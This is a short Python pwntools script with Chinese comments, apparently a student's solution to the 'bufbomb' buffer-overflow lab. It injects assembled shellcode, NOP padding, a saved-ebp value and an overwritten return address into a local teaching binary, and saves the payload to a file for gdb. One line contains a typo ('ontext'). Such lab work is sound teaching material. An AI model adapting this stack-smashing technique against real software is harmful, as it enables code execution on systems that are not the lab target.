from pwn import *

ontext.log_level = 'debug'
io = process(["./bufbomb", "-u", "2212080197"])

# 生成机器码(这里的格式只能是Intel格式，ATT格式识别会出问题)
assembly_code = """
mov  eax, 0x3962b26d
push 0x08048dbe
ret
"""
machine_code = asm(assembly_code)
# print(machine_code)

# 计算需要添加的NOPs的数量，并添加NOPs
nop_count = 40 - len(machine_code)
machine_code += nop_count * asm(shellcraft.nop())

# 添加ebp和跳转
payload = machine_code + p32(0x55683d40) + p32(0x55683ce8)

# 发送Payload,并打印回显
io.sendline(payload)
# print(payload)

# 打开一个文件以写入字节流,方便gdb进行文件输入调试
# r < boom_python_raw -u 2212080197
# 'wb'参数表示以二进制写入方式打开
with open('boom_python_raw', 'wb') as f:
    # 生成一个字节流
    # 将字节流写入文件
    f.write(payload)

# recv函数接收到的是字节串，可以利用decode()函数将字节串转换成字符串打印
data = io.recv()
print(data.decode())

# 附加进程方式需要额外指定以打开要使用的终端，且终端容易被kill,不推荐
# context.terminal = ['konsole', '-e']
# gdb.attach(io)
